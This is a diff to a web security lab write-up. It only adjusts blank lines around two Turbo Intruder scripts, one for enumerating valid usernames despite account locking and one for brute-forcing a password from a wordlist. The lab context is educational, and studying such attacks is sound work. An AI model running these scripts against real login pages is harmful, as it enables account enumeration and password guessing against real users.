@@ -13,6 +13,7 @@ This lab is vulnerable to username enumeration. It uses account locking, but thi
 
 # Turbo Intruder Code
 First code to enumerate valid username:
+
     def queueRequests(target, wordlists):
         engine = RequestEngine(endpoint=target.endpoint,
             concurrentConnections=1,
@@ -20,7 +21,6 @@ First code to enumerate valid username:
             pipeline=False,
             engine=Engine.THREADED
     )
-
     with open("/home/duong/username.txt", "r") as f:
         username = [line.strip() for line in f if line.strip()]
     password = ['peter1', 'peter2', 'peter3', 'peter4', 'peter5']
@@ -31,6 +31,7 @@ First code to enumerate valid username:
         table.add(req)
 
 Second code to brute force password:
+
     def queueRequests(target, wordlists):
         engine = RequestEngine(endpoint=target.endpoint,
             concurrentConnections=3,
@@ -38,7 +39,6 @@ Second code to brute force password:
             pipeline=False,
             engine=Engine.THREADED
     )
-
     with open("/home/duong/password.txt", "r") as f:
         password = [line.strip() for line in f if line.strip()]
     for p in password:
